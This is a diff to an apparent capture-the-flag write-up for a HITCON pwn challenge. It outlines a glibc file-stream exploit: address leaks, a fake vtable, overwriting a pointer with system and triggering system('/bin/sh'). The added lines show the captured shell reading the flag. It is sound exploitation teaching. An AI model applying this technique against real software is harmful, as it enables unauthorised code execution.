@@ -241,10 +241,22 @@ Great! So call vtable after modify +0x230 pointer to vtable address-0x18, +0x240
 
 > The final exploit scenario:
 >- Allocate 3 file streams
->- Get heap and libc address by above method (set _\_IO_read_end\__ to avoid null byte at the end) 
+>- Get heap and libc address by above method (set _\_IO_read_end_ to avoid null byte at the end) 
 >- Free file 0, make 2 library pointer differs 0x10.
 >- Make fake table at before first library pointer and change first library pointer to &func-0x18
 >- Overwrite second library pointer to system
 >- Close chunk 2, call system("/bin/sh")!
 
+> Closing /dev/fd/0 ...
+> /bin/sh: 0: can't access tty; job control turned off
+> $ id
+> uid=2139990319 gid=1337 groups=1337
+> $ cd /home/babyfs
+> $ ls
+> b4by_fl49  babyfs.bin  flag
+> $ 
+> $ cat b4by_fl49
+> hitcon{pl4y_w1th_f1l3_Struc7ure_1s_fUn}
+> $  
 
+It was great challenge!
